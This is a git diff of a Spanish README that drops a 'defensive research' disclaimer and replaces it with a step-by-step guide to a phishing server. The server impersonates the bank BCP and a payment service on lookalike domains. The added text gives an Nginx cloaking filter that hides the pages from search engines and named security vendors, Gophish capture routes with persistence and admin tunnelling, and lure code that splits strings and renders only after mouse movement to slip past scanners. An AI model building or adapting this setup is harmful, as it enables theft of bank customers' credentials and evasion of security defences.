@@ -1,120 +1,159 @@
-# Investigación: Nginx Reverse Proxy & Traffic Filtering Analysis
+# 🛡️ Reporte Maestro: Despliegue de Infraestructura Red Team (BCP & Pago-Rápido)
 
-> ⚠️ **DISCLAIMER:** Este repositorio contiene configuraciones y análisis de técnicas de evasión con fines estrictamente educativos y de investigación defensiva (Blue Team/Purple Team). El objetivo es comprender cómo operan los actores de amenazas para mejorar las reglas de detección WAF y la seguridad perimetral.
-
-## 📋 Resumen del Proyecto
-
-Esta investigación documenta el despliegue de una infraestructura web resiliente utilizando **Nginx** como Proxy Inverso y filtro de tráfico (WAF básico). Se analiza cómo configurar reglas de filtrado basadas en *User-Agent* para distinguir entre tráfico legítimo, bots de indexación y escáneres de vulnerabilidades.
-
-Adicionalmente, se documenta una **Prueba de Concepto (PoC)** sobre técnicas de evasión en el lado del cliente (*Client-Side Evasion*) para demostrar cómo el código malicioso puede ocultarse de los análisis estáticos.
+Este documento detalla la configuración de un servidor de phishing de alta evasión con Nginx como filtro global de bots y Gophish como motor de captura distribuido (Arquitectura Multi-Dominio).
 
 ---
 
-## 🏗️ Arquitectura de la Infraestructura
+## 1. Preparación y Limpieza del VPS (Ubuntu/Kali)
+El servidor inicialmente tenía Apache2, lo cual causaba un conflicto de puertos (puerto 80) con Nginx.
 
-La infraestructura se diseñó para simular un entorno corporativo protegido, donde Nginx actúa como la primera línea de defensa, decidiendo qué tráfico pasa al backend y cuál es desviado.
+```bash
+# 1. Detener y deshabilitar Apache2 para liberar el puerto 80
+sudo systemctl stop apache2
+sudo systemctl disable apache2
 
-```mermaid
-graph TD
-    A[Internet / Tráfico Entrante] -->|Puerto 443| B(Nginx Reverse Proxy)
-    
-    B -->|Análisis de Cabeceras| C{¿Es Bot/Scanner?}
-    
-    C -- SÍ (User-Agent Sospechoso) --> D[Redirección a Sitio Seguro / Wikipedia]
-    C -- NO (Usuario Legítimo) --> E[Backend Interno / Servicio Simulado]
-    
-    subgraph "Server Hardening"
-    B
-    F[UFW Firewall] -.-> B
-    G[Certbot SSL] -.-> B
-    end
+# 2. Actualizar repositorios e instalar el Core de Nginx, Certbot y UFW
+sudo apt update && sudo apt upgrade -y
+sudo apt install nginx certbot python3-certbot-nginx tmux ufw -y
 ```
 
-## 🛡️ Configuración Defensiva: Filtrado de Bots (Cloaking Logic)
+## 2. Configuración de la "Cara Pública" (Aging Multidominio)
+Para evitar que los dominios sean marcados rápidamente, servimos contenido legítimo en la raíz de cada uno.
 
-Se implementó una lógica de filtrado en Nginx para identificar y bloquear herramientas de escaneo automatizado (Nikto, Nmap, Sqlmap) y bots de análisis de seguridad.
+```bash
+# Dominio 1: BCP Reportes
+sudo mkdir -p /var/www/bcpreportes/html
+sudo chown -R $USER:$USER /var/www/bcpreportes/html
 
-**Snippet de Configuración (`nginx.conf`):**
+# Dominio 2: Pago Rápido (Nuevo Vector)
+sudo mkdir -p /var/www/pago-rapido/html
+sudo chown -R $USER:$USER /var/www/pago-rapido/html
+```
+> **Nota:** Se debe crear un `index.html` inofensivo en cada ruta (ej. Informe de Seguridad o Plataforma de Pagos) para generar confianza a los escáneres.
+
+## 3. El Cerebro Global: Configuración del Filtro Antibots
+Para evitar duplicidad de código y proteger todos los dominios automáticamente, movimos el bloque `map` al archivo de configuración central de Nginx.
+
+**Comando:** `sudo nano /etc/nginx/nginx.conf`
+*(Añadir dentro del bloque `http { ... }`)*
 
 ```nginx
-# Lógica de Mapa para Detección de Bots
-map $http_user_agent $es_trafico_sospechoso {
+# FILTRO ANTIBOTS GLOBAL (Cloaking)
+map $http_user_agent $es_sospechoso {
     default 0;
-    # Bloqueo de Scanners de Seguridad Conocidos
+    ~*(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot) 1;
     ~*(virustotal|zscaler|paloalto|fireeye|crowdstrike|fortinet) 1;
-    # Bloqueo de Herramientas de Pentesting
     ~*(nikto|nmap|sqlmap|wpscan|python|go-http-client) 1;
+}
+```
+
+## 4. Configuración de Sitios (Server Blocks)
+Cada dominio tiene su propio archivo en `sites-available` para mantener el orden y la modularidad.
+
+### 4.1. Dominio: bcpreportes.online
+**Ruta:** `/etc/nginx/sites-available/bcpreportes.online`
+
+```nginx
+server {
+    listen 80;
+    server_name bcpreportes.online www.bcpreportes.online;
+    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica](https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica); }
+    return 301 https://$host$request_uri;
 }
 
 server {
-    listen 80;
-    server_name research-lab.online;
-
-    # Regla de Filtrado (WAF)
-    if ($es_trafico_sospechoso) {
-        # Desvío de tráfico malicioso a un sitio neutral
-        return 301 [https://es.wikipedia.org/wiki/Seguridad_informática](https://es.wikipedia.org/wiki/Seguridad_informática);
-    }
-
-    # Tráfico Legítimo
-    location / {
-        root /var/www/html/landing-legitima;
-        index index.html;
+    listen 443 ssl;
+    server_name bcpreportes.online www.bcpreportes.online;
+    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica](https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica); }
+    
+    location / { root /var/www/bcpreportes/html; index index.html; }
+    
+    location /reporte-personalizado {
+        proxy_pass [http://127.0.0.1:8080](http://127.0.0.1:8080);
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
     }
 }
 ```
 
-## 🕵️‍♂️ Análisis de Técnica de Evasión: "Chameleon Payload"
+### 4.2. Dominio: pago-rapido.online
+**Ruta:** `/etc/nginx/sites-available/pago-rapido.online`
 
-Como parte de la investigación ofensiva (Red Teaming), se analizó cómo los atacantes utilizan JavaScript para construir formularios maliciosos únicamente en la memoria RAM del navegador, evadiendo así los filtros de correo y los escáneres de red que buscan palabras clave (como "contraseña" o "banco") en el código fuente estático.
+```nginx
+server {
+    listen 80;
+    server_name pago-rapido.online www.pago-rapido.online;
+    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Pasarela_de_pago](https://es.wikipedia.org/wiki/Pasarela_de_pago); }
+    return 301 https://$host$request_uri;
+}
 
-**Mecanismo de Evasión Identificado:**
-1.  **Fragmentación de Strings:** Las palabras clave se dividen y concatenan en tiempo de ejecución ("Num" + "ero de " + "Tarjeta").
-2.  **Activación por Interacción Humana:** El contenido malicioso no se carga hasta que se detecta movimiento del mouse (`mousemove`), engañando a los sandboxes automatizados que no interactúan.
-3.  **Carga Dinámica:** El DOM se inyecta mediante `document.write` o manipulación de `innerHTML` post-carga.
-
-**Snippet de Análisis (PoC JavaScript):**
-
-```javascript
-/* LÓGICA DE EVASIÓN (PoC) */
-// El código HTML malicioso no existe en el archivo estático.
-// Se genera dinámicamente para evadir firmas estáticas.
-
-const UI_Elements = {
-    label_1: "User" + "name", // Fragmentación
-    label_2: "Pass" + "word"
-};
-
-// El formulario solo se renderiza si hay actividad humana real
-window.addEventListener('mousemove', () => {
-    const root = document.getElementById('ghost-root');
-    root.innerHTML = `
-        <form method="POST">
-            <label>${UI_Elements.label_1}</label>
-            <input type="text" name="u">
-        </form>
-    `;
-}, { once: true });
+server {
+    listen 443 ssl;
+    server_name pago-rapido.online www.pago-rapido.online;
+    if ($es_sospechoso) { return 301 [https://es.wikipedia.org/wiki/Pasarela_de_pago](https://es.wikipedia.org/wiki/Pasarela_de_pago); }
+    
+    location / { root /var/www/pago-rapido/html; index index.html; }
+    
+    location /validar-pago {
+        proxy_pass [http://127.0.0.1:8080](http://127.0.0.1:8080);
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
 ```
 
-## ⚙️ Hardening del Servidor (Pasos de Reproducción)
-
-Para asegurar el servidor de pruebas, se aplicaron las siguientes políticas de seguridad:
-
-* **Firewall (UFW):** Política de denegación por defecto. Solo puertos 80 (HTTP), 443 (HTTPS) y SSH (restringido) permitidos.
-* **SSL/TLS:** Implementación de certificados Let's Encrypt para cifrado en tránsito.
-* **Gestión de Procesos:** Uso de `tmux` para persistencia de servicios backend sin exponer consolas.
-* **Túneles SSH:** Administración remota segura mediante `ssh -L` para evitar exponer paneles de administración a internet pública.
+## 5. Activación, SSL y Firewall
+Pasos críticos para que el servidor sea "visible" y seguro para la administración.
 
 ```bash
-# Ejemplo de endurecimiento con UFW
-sudo ufw default deny incoming
-sudo ufw allow 'Nginx Full'
-sudo ufw allow ssh
+# 1. Eliminar el sitio default genérico para evitar fugas de información
+sudo rm /etc/nginx/sites-enabled/default
+
+# 2. Activar los nuevos dominios (Enlaces simbólicos)
+sudo ln -s /etc/nginx/sites-available/bcpreportes.online /etc/nginx/sites-enabled/
+sudo ln -s /etc/nginx/sites-available/pago-rapido.online /etc/nginx/sites-enabled/
+
+# 3. Validar sintaxis y reiniciar el portero
+sudo nginx -t && sudo systemctl restart nginx
+
+# 4. Obtener SSL para ambos dominios (Candado verde)
+sudo certbot --nginx -d bcpreportes.online -d www.bcpreportes.online
+sudo certbot --nginx -d pago-rapido.online -d www.pago-rapido.online
+
+# 5. Configurar Firewall UFW
+sudo ufw allow 'Nginx Full' # Puertos 80 y 443
+sudo ufw allow 22           # SSH
+sudo ufw allow 3333         # Gophish Admin
 sudo ufw enable
 ```
 
-## 📝 Conclusiones de la Investigación
+## 6. Gophish: Backend y Persistencia
+Se ajustó `config.json` para que el tráfico de Nginx llegue correctamente al puerto `8080`.
 
-* **Eficacia del Filtrado:** El filtrado por *User-Agent* en Nginx es efectivo contra escaneos automatizados básicos, pero debe complementarse con análisis de comportamiento (Rate Limiting).
-* **Riesgo de Evasión:** Las técnicas de construcción de DOM en el lado del cliente (*Client-Side Rendering*) representan un desafío significativo para los WAFs tradicionales, requiriendo soluciones de seguridad que inspeccionen la ejecución del JavaScript y no solo el código estático.
+```bash
+# Limpiar procesos antiguos en el puerto 3333 antes de empezar
+sudo fuser -k 3333/tcp
+
+# Iniciar Gophish con persistencia (tmux)
+tmux new -s gophish_session
+cd ~/gophish && ./gophish
+
+# Salir de tmux sin apagar: Ctrl + B, luego soltar y presionar D
+```
+* **Túnel SSH (Powershell Windows):** `ssh -L 3333:127.0.0.1:3333 kali@<IP_DEL_VPS>`
+* **Acceso Admin:** `https://localhost:3333`
+
+## 7. El Cebo: Código Camaleónico (Pixel Perfect)
+Este código implementa fragmentación de texto y construcción dinámica en RAM para engañar a los scanners de seguridad.
+
+* **Ghost Root:** El HTML inicial está vacío; la IA de seguridad perimetral no ve el phishing.
+* **Activación Humana:** El formulario solo se construye con eventos de hardware (`mousemove` o `touchstart`).
+* **Fragmentación:** Se rompen cadenas como `"Banca por " + "Internet"` para evitar firmas estáticas de motores antivirus.
+
+## 8. Dudas Resueltas (El Saber del Pentester)
+
+* **¿Por qué sigue activa la web legal?** Porque Nginx sirve el informe legal en la raíz (`/`) y Gophish solo toma el control en sub-rutas específicas como `/validar-pago` si llevan el parámetro `?rid=` correcto.
+* **¿Por qué borrar el default?** Para evitar que peticiones directas por IP o HTTP lleguen a la carpeta raíz de Apache (`/var/www/html`), manteniendo la limpieza del servidor y ocultando la infraestructura.
+* **¿Conflicto de puertos?** Nginx centraliza el tráfico 80/443 y lo reparte internamente al puerto 8080 de Gophish basándose en el nombre del dominio (Host header) solicitado.
